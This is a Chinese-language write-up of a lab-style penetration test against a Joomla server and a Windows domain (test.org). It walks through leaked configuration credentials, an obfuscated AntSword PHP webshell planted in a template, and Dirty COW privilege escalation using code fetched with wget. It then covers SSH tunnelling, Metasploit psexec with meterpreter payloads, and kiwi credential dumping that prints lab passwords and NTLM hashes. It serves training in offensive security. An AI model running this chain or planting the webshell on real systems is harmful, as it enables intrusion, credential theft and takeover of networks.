# getshell
## 信息收集
**端口服务扫描**

```plain
nmap -Pn -sV 192.168.242.10

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
80/tcp   open  http    nginx 1.9.4
3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785979575887-8001f2ab-0068-494e-ae26-a4e4e40269fa.png)

### 80端口
**目录扫描**

```plain
dirb http://192.168.242.10/
```

结果

+  /configuration.php~ 
+ /.configuration.php.swp 
+ /1.php 
+ /administrator/index.php  
+ /2.php

**漏洞扫描**

```plain
nmap --script vuln -Pn -p80 192.168.242.10
```

结果:没有发现高危漏洞

```plain
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.242.10
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.242.10:80/
|     Form id: mod-search-searchword87
|     Form action: /index.php
|     
|     Path: http://192.168.242.10:80/index.php/about
|     Form id: mod-search-searchword87
|     Form action: /index.php/about
|     
|     Path: http://192.168.242.10:80/index.php/5-your-modules
|     Form id: mod-search-searchword87
|     Form action: /index.php
|     
|     Path: http://192.168.242.10:80/index.php
|     Form id: mod-search-searchword87
|     Form action: /index.php
|     
|     Path: http://192.168.242.10:80/index.php/4-about-your-home-page
|     Form id: mod-search-searchword87
|_    Form action: /index.php

```

**浏览网页**

+ /administrator/index.php 

后台管理页面<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785984847278-22f049bb-8f83-43e6-8e1d-1123446f5d03.png)

+ **/configuration.php~ **

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785980998089-98dd6973-7fcf-4b90-842d-2093df0e173a.png)

分析结果:发现数据库信息泄露,已知mysql端口暴露可以直接远程连接

```plain
类别	内容
CMS	Joomla（表前缀 am2zu_）
数据库名	joomla
数据库用户	testuser
数据库密码	cvcvgjASD!@
Web 根目录	/var/www/html
```

+ **/.configuration.php.swp**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785981081097-c1abe3b8-5a69-4064-8ae1-fa59c8748886.png)

无访问权限

+ **1.php**

phpinfo页面,可能只是干扰项

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785983097678-97345f87-c83b-416f-91a5-d8880d34b54b.png)

## 漏洞验证
目前已知数据库配置信息,并且3306端口开放,可以尝试登录数据库

```plain
表前缀 am2zu_
数据库名	joomla
数据库用户	testuser
数据库密码	cvcvgjASD!@
```

登录数据库,使用vscode的插件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785984618651-cd6ec516-4ea1-41ec-b418-42b05bd5212f.png)

找到用户表

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785984687987-9cf7bbb9-4b58-485b-a710-3c5c030c2de9.png)

看到管理员账号数据

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785984760674-ef99ef00-92a6-4ed8-ba5e-d060a787f36a.png)

替换管理员密码位secret的哈希值`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199</font>`

## <font style="color:rgb(15, 17, 21);">漏洞利用</font>
登录后台管理后台administrator:secret

进入模板界面

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1785985968520-af11e1f2-1448-462a-8300-92144b4bf935.png)

用蚁剑生成webshell

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786083764561-f03e490f-fadc-4038-9416-445085c226fa.png)

```plain
<?php // 使用时请删除此行, 连接密码: 123 ?>
<?php $Hsas=create_function(chr(32076/891).str_rot13('f').base64_decode('bw==').str_rot13('z').chr(86658/858),chr(0173372/01162).str_rot13('i').str_rot13('n').chr(378-270).chr(891-851).chr(435-399).chr(0x2d4-0x261).str_rot13('b').str_rot13('z').chr(52722/522).str_rot13(')').str_rot13(';'));$Hsas(base64_decode('ODQ2M'.'TQ2O0'.'BldkF'.'sKCRf'.''.chr(0737-0612).chr(210-141).base64_decode('OQ==').chr(0216444/01545).base64_decode('Vg==').''.''.base64_decode('Rg==').str_rot13('f').str_rot13('k').str_rot13('Z').chr(0x178cc/0x38e).''.'NdKTs'.'yNTM4'.'NDM4O'.'w=='.''));?>
```

上传webshell

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786083848038-d9541530-ce0a-4792-8fb5-361a711a44f0.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786083850602-b5fbfd37-ef58-489a-a048-410e3bca65bf.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786083949638-3a297774-d9af-45be-b40d-bea9e8d88ab6.png)

保存

之前目录扫描的结果显示目录在<font style="color:rgb(23, 23, 23);background-color:rgba(115, 115, 115, 0.12);">/templates/beez3/</font>

<font style="color:rgb(23, 23, 23);">蚁剑连接</font>`http://192.168.242.35<font style="color:rgb(23, 23, 23);">/templates/beez3/</font>`密码123

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786084143581-1b9c5095-ed58-4617-b4f8-23b0c3f1a90e.png)

成功getshell

# 权限提升
**信息收集**

先指定命令解释器

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786084459389-12bda0a5-c257-4969-974f-48962b98fb25.png)

尝试基础信息收集发现命令被禁用了,直接蚁剑翻找目录文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786084740232-1b9994e6-20a0-468e-85d6-25f9e4f9dcee.png)

找到相可疑文件,猜测是ssh账号密码

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786084657939-cf267f24-4e08-44c2-8835-e243af4a6fa3.png)

**ssh登录**

```plain
ssh wwwuser@192.168.242.35
wwwuser_123Aqx
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786085709320-9d343a85-c966-4cc3-a623-b1803bf6aefc.png)

**再信息收集**

```plain
[wwwuser@localhost ~]$ uname -a
Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
```

 这是CentOS 6 x86_64	linux内核版本2.6.32

**内核漏洞提权**

```plain
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c

#kali开启http服务
python3 -m http.server 8000

#靶机上下载并编译
cd /tmp
wget http://192.168.188.127:8000/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
#执行提权等待十秒,然后ctrl+c退出
chmod +x dirty
./dirty 123456
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 123456
Complete line:
toor:toKbqrb/U79xA:0:0:pwned:/root:/bin/bash
#切换到新账户
su toor
```

成功到root账户

# 横向移动
## **内网信息收集**
**先看拓扑结构**

```plain
ip a 
route -n
```

结果总结

```plain
三个网段
eth3	192.168.242.17	192.168.242.0/24	外网
eth2	192.168.93.100	192.168.93.0/24	内网
eth4	10.0.2.15	10.0.2.0/24
```

目标是192.168.93.100	192.168.93.0/24

**用fscan扫描内网网段**

```plain
# 先下载 fscan 到 Kali（如果没有）
wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan -O /tmp/fscan
cd /tmp
python3 -m http.server 8000
#靶机上
cd /tmp
wget http://192.168.188.127:8000/fscan
chmod +x fscan
./fscan -h 192.168.93.0/24
```

结果

```plain
192.168.93.0/24 内网
├── 93.100  当前 Linux 跳板 (已控，root)
├── 93.120  另一台 Linux (MySQL root/123 弱口令)
├── 93.10   域控 DC (Win 2012 R2, test.org)
├── 93.20   Win 2008 (MSSQL 1433)
└── 93.30   Win 7 SP1
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786091127459-3e0b0b44-9314-4c17-9ae2-c232ac81e111.png)

<details class="lake-collapse"><summary id="u9e6ed52f"><span class="ne-text">fscan输出</span></summary><p id="u60330561" class="ne-p" style="line-height: 1"><span class="ne-text">(icmp) Target 192.168.93.100  is alive</span></p><p id="ue0b55901" class="ne-p" style="line-height: 1"><span class="ne-text">(icmp) Target 192.168.93.120  is alive</span></p><p id="uc3134e08" class="ne-p" style="line-height: 1"><span class="ne-text">(icmp) Target 192.168.93.10   is alive</span></p><p id="uf7129552" class="ne-p" style="line-height: 1"><span class="ne-text">(icmp) Target 192.168.93.30   is alive</span></p><p id="u6423d1f8" class="ne-p" style="line-height: 1"><span class="ne-text">(icmp) Target 192.168.93.20   is alive</span></p><p id="ub38b46db" class="ne-p" style="line-height: 1"><span class="ne-text">[*] Icmp alive hosts len is: 5</span></p><p id="u70d585c8" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.20:80 open</span></p><p id="u5a15da89" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.120:22 open</span></p><p id="u308fe984" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.120:80 open</span></p><p id="u43d9c5cf" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.100:80 open</span></p><p id="ufe94f86d" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.20:135 open</span></p><p id="ud120bac5" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.10:135 open</span></p><p id="u1e1c0772" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.20:139 open</span></p><p id="u1df51ba9" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.10:139 open</span></p><p id="u3d0d342a" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.30:135 open</span></p><p id="u39d0cad0" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.30:139 open</span></p><p id="u95c8421f" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.20:445 open</span></p><p id="u5477e5d8" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.10:445 open</span></p><p id="u0d795b4d" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.20:1433 open</span></p><p id="u249e3ebf" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.120:3306 open</span></p><p id="u06a517f1" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.30:445 open</span></p><p id="u48930a58" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.10:88 open</span></p><p id="u83adfbf7" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.100:22 open</span></p><p id="u49467424" class="ne-p" style="line-height: 1"><span class="ne-text">192.168.93.100:3306 open</span></p><p id="uda0a0451" class="ne-p" style="line-height: 1"><span class="ne-text">[*] alive ports len is: 18</span></p><p id="ucf86c6ad" class="ne-p" style="line-height: 1"><span class="ne-text">start vulscan</span></p><p id="uf036c21d" class="ne-p" style="line-height: 1"><span class="ne-text">[*] WebTitle </span><a href="http://192.168.93.20" data-href="http://192.168.93.20" target="_blank" class="ne-link"><span class="ne-text">http://192.168.93.20</span></a><span class="ne-text">      code:404 len:315    title:Not Found</span></p><p id="uec35f351" class="ne-p" style="line-height: 1"><span class="ne-text">[*] NetInfo </span></p><p id="u3e5c7e63" class="ne-p" style="line-height: 1"><span class="ne-text">[*]192.168.93.20</span></p><p id="u1256a0f6" class="ne-p" style="line-height: 1"><span class="ne-text">   [-&gt;]win2008</span></p><p id="uf2288eee" class="ne-p" style="line-height: 1"><span class="ne-text">   [-&gt;]192.168.93.20</span></p><p id="u93738e7a" class="ne-p" style="line-height: 1"><span class="ne-text">[*] NetInfo </span></p><p id="ue0e64d72" class="ne-p" style="line-height: 1"><span class="ne-text">[*]192.168.93.30</span></p><p id="uef4c606f" class="ne-p" style="line-height: 1"><span class="ne-text">   [-&gt;]win7</span></p><p id="ua55ae237" class="ne-p" style="line-height: 1"><span class="ne-text">   [-&gt;]192.168.93.30</span></p><p id="uca0a8277" class="ne-p" style="line-height: 1"><span class="ne-text">[*] NetInfo </span></p><p id="ud7afc976" class="ne-p" style="line-height: 1"><span class="ne-text">[*]192.168.93.10</span></p><p id="u871997cc" class="ne-p" style="line-height: 1"><span class="ne-text">   [-&gt;]WIN-8GA56TNV3MV</span></p><p id="u137c3552" class="ne-p" style="line-height: 1"><span class="ne-text">   [-&gt;]192.168.93.10</span></p><p id="u0a77e8c0" class="ne-p" style="line-height: 1"><span class="ne-text">[*] OsInfo 192.168.93.20        (Windows Server (R) 2008 Datacenter 6003 Service Pack 2)</span></p><p id="u53ea03ca" class="ne-p" style="line-height: 1"><span class="ne-text">[*] OsInfo 192.168.93.10        (Windows Server 2012 R2 Datacenter 9600)</span></p><p id="u3572879d" class="ne-p" style="line-height: 1"><span class="ne-text">[*] OsInfo 192.168.93.30        (Windows 7 Professional 7601 Service Pack 1)</span></p><p id="u4a61b2ee" class="ne-p" style="line-height: 1"><span class="ne-text">[*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2</span></p><p id="u91c1e6c2" class="ne-p" style="line-height: 1"><span class="ne-text">[*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600</span></p><p id="u4c9da864" class="ne-p" style="line-height: 1"><span class="ne-text">[+] mysql 192.168.93.120:3306:root 123</span></p><p id="udfda7401" class="ne-p" style="line-height: 1"><span class="ne-text">[+] mysql 192.168.93.100:3306:root 123                                                                                            </span></p><p id="u2ff083ec" class="ne-p" style="line-height: 1"><span class="ne-text">[*] WebTitle </span><a href="http://192.168.93.100" data-href="http://192.168.93.100" target="_blank" class="ne-link"><span class="ne-text">http://192.168.93.100</span></a><span class="ne-text">     code:200 len:16020  title:Home                                                             </span></p><p id="udb017d40" class="ne-p" style="line-height: 1"><span class="ne-text">[*] WebTitle </span><a href="http://192.168.93.120" data-href="http://192.168.93.120" target="_blank" class="ne-link"><span class="ne-text">http://192.168.93.120</span></a><span class="ne-text">     code:200 len:16020  title:Home</span></p><p id="u827e653c" class="ne-p" style="line-height: 1"><span class="ne-text">已完成 16/18 [-] ssh 192.168.93.120:22 root root@123#4 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain </span></p><p id="u67a16bff" class="ne-p"><span class="ne-text"></span></p></details>
## 建立隧道打通内网
### ssh动态转发(正向隧道)
前提: 可以 ssh 登录跳板  

在新的kali终端执行

```plain
ssh -D 1088 -f -N -o HostKeyAlgorithms=+ssh-rsa wwwuser@192.168.242.35
#输入密码后自动返回新的命令输入行
#第一次建立隧道执行
sed -i 's/^strict_chain/#strict_chain/' /etc/proxychains4.conf
sed -i 's/^#dynamic_chain/dynamic_chain/' /etc/proxychains4.conf
sed -i 's/^socks5/#socks5/' /etc/proxychains4.conf
echo "socks5 127.0.0.1 1088" >> /etc/proxychains4.conf

#验证
proxychains4 nmap 192.168.93.0/24 -p1-1000
```

### ssh远程端口反向转发(反向隧道)
前提:可以ssh登录跳板机

```plain
#靶机执行
echo "GatewayPorts yes" >> /etc/ssh/sshd_config
service sshd restart
#新的kali终端执行
ssh -R 4444:127.0.0.1:4444 -f -N -o HostKeyAlgorithms=+ssh-rsa wwwuser@192.168.242.35
```

## 横向到win2008  93.20
<font style="color:rgb(23, 23, 23);background-color:rgba(115, 115, 115, 0.08);">① 密码喷洒 → ② 确认凭据有效 → ③ 开 handler → ④ psexec 打 → ⑤ 收到 shell</font>

**smb爆破**

<font style="color:rgb(77, 77, 77);">得到用户名和密码administrator:123qwe!ASD</font>

**psexec**

```plain
msfconsole
#设置ssh代理
setg Proxies socks5:127.0.0.1:1088
# 允许反向连接走代理（备用，正向载荷可以不用，但加上更稳）
setg ReverseAllowProxy true
```

```plain

use exploit/windows/smb/psexec
set RHOSTS 192.168.93.20
set SMBUser administrator
set SMBPass 123qwe!ASD
set LHOST 192.168.93.100	边界机内网ip
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

直接运行,他会自己开启handler接受会话

```plain
Win2008 → 192.168.93.100:4444 (跳板机) → SSH -R → Kali:4444 → meterpreter
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786329494851-e840713d-df0e-4f12-a8c7-eb5e68e967d5.png)

成功横向

## 横向到win7 93.30
**信息收集**

```plain
getuid
getsystem
load kiwi
creds_all
```

```plain
#把当前会话放后台
background
#修改参数
set RHOSTS 192.168.93.30
run
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786331481803-74b1c17e-ff8f-4713-a5dc-2aaac597738f.png)

拿到win7

## 横向到dc
**信息收集**

```plain
ipconfig
load kiwi
creds_all
```

<details class="lake-collapse"><summary id="u8d919ca2"><span class="ne-text">creds_all</span></summary><p id="u9b261423" class="ne-p"><span class="ne-text">meterpreter &gt; creds_all<br /></span><span class="ne-text">[proxychains] DLL init: proxychains-ng 4.17<br /></span><span class="ne-text">[proxychains] DLL init: proxychains-ng 4.17<br /></span><span class="ne-text">[+] Running as SYSTEM<br /></span><span class="ne-text">[*] Retrieving all credentials<br /></span><span class="ne-text">msv credentials<br /></span><span class="ne-text">===============</span></p><p id="ucb5cfa1e" class="ne-p"><span class="ne-text">Username       Domain  NTLM                              SHA1</span></p><hr id="aP2xU" class="ne-hr"><p id="uac7cc5a0" class="ne-p"><span class="ne-text">Administrator  WIN7    31c1794c5aa8547c87a8bcd0324b8337  128c0272959b85b330090611169d07d85cb6bd0b<br /></span><span class="ne-text">WIN7$          TEST    bb6b48766fb280d74babb50e781bbc21  4ebd2d435d946f95f31d5c16351791fea97e8f43</span></p><p id="uabe92361" class="ne-p"><span class="ne-text">wdigest credentials<br /></span><span class="ne-text">===================</span></p><p id="u33f3ad00" class="ne-p"><span class="ne-text">Username       Domain  Password</span></p><hr id="x0XMx" class="ne-hr"><p id="ud87aca25" class="ne-p"><span class="ne-text">(null)         (null)  (null)<br /></span><span class="ne-text">Administrator  WIN7    123qwe!ASD<br /></span><span class="ne-text">WIN7$          TEST    Xp:b4</span><em><span class="ne-text">hsKA</span></em><span class="ne-text">;!&gt;;kdR2,_xtp?kPNozV.4&lt;y:lcsCdtI73*n&lt;M)&amp;&lt;GX0hY18?'FezvRL0SIOYg-9Q</span><code class="ne-code"><span class="ne-text">K?2sh:w!lyL&gt;<br /></span><span class="ne-text">                       &lt;H1&amp;VNLKHYW0</span></code><span class="ne-text">emOz9geR4im!xBKodB</span></p><p id="u8c8b1c79" class="ne-p"><span class="ne-text">kerberos credentials<br /></span><span class="ne-text">====================</span></p><p id="u8127701d" class="ne-p"><span class="ne-text">Username       Domain    Password</span></p><hr id="Db8VC" class="ne-hr"><p id="u02a4e4d5" class="ne-p"><span class="ne-text">(null)         (null)    (null)<br /></span><span class="ne-text">Administrator  WIN7      (null)<br /></span><span class="ne-text">win7</span><span id="xQ9Hh" class="ne-math" style="padding: 0 2px; border: 1px solid #e8e8e8; border-radius: 2px; background: #f9f9f9">          test.org  Xp:b4*hsKA*;!&gt;;kdR2,_xtp?kPNozV.4&lt;y:lcsCdtI73*n&lt;M)&amp;&lt;GX0hY18?'FezvRL0SIOYg-9Q`K?2sh:w!ly<br />                         L&gt;&lt;H1&amp;VNLKHYW0`emOz9geR4im!xBKodB<br />win7</span><span class="ne-text">          TEST.ORG  Xp:b4</span><em><span class="ne-text">hsKA*;!&gt;;kdR2,_xtp?kPNozV.4&lt;y:lcsCdtI73</span></em><span class="ne-text">n&lt;M)&amp;&lt;GX0hY18?'FezvRL0SIOYg-9Q</span><code class="ne-code"><span class="ne-text">K?2sh:w!ly<br /></span><span class="ne-text">                         L&gt;&lt;H1&amp;VNLKHYW0</span></code><span class="ne-text">emOz9geR4im!xBKodB</span></p><p id="ue4c3b3e0" class="ne-p"><br></p><p id="u7439a851" class="ne-p"><span class="ne-text">[proxychains] DLL init: proxychains-ng 4.17<br /></span><span class="ne-text">[proxychains] DLL init: proxychains-ng 4.17<br /></span><span class="ne-text">[proxychains] DLL init: proxychains-ng 4.17<br /></span><span class="ne-text">[proxychains] DLL init: proxychains-ng 4.17<br /></span><span class="ne-text">[proxychains] DLL init: proxychains-ng 4.17<br /></span><span class="ne-text">meterpreter &gt;</span></p></details>
```plain
Administrator					123qwe!ASD	本地管理员（Domain 是 WIN7，不是 TEST）
Administrator NTLM		31c1794c5aa8547c87a8bcd0324b8337	可用于 PTH
WIN7$									bb6b48766fb280d74babb50e781bbc21	机器账户 hash
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786345706122-132b8193-8618-406b-8b42-2b5b1fea0550.png)

<font style="color:rgb(23, 23, 23);">没有域管登录过这台机器</font>

<font style="color:rgb(23, 23, 23);">域名是test.org</font>

**<font style="color:rgb(23, 23, 23);">攻击</font>**

```plain
msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf exploit(windows/smb/psexec) > set RHOST 192.168.93.10
RHOST => 192.168.93.10
msf exploit(windows/smb/psexec) > set LPORT 5555
LPORT => 5555
msf exploit(windows/smb/psexec) > run
[*] 192.168.93.10:445 - Connecting to the server...
[*] 192.168.93.10:445 - Authenticating to 192.168.93.10:445|TEST as user 'administrator'...
[*] 192.168.93.10:445 - Selecting PowerShell target
[*] 192.168.93.10:445 - Executing the payload...
[+] 192.168.93.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Started bind TCP handler against 192.168.93.10:5555
[*] Exploit completed, but no session was created.
msf exploit(windows/smb/psexec) > 
```

正向反向载荷都不行,改成用msf autoroute路由

```plain
# 在 Win2008 的 meterpreter 中添加路由
meterpreter > run autoroute -s 192.168.93.0/24
meterpreter > background

# 取消全局代理，避免冲突
unsetg Proxies

# 使用 psexec 通过 session 路由
use exploit/windows/smb/psexec
set RHOSTS 192.168.93.10
set SMBUser administrator
set SMBPass zxcASDqw123!!
set SMBDomain TEST
set payload windows/x64/meterpreter/reverse_tcp
set LHOST  192.168.93.20
set LPORT 5555
run
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786367746263-1f676fdf-217c-403b-b999-7f6190b9d24e.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1786367748585-f0fcd1ae-c78f-4166-b9ea-00c82dfb1ab7.png)

---



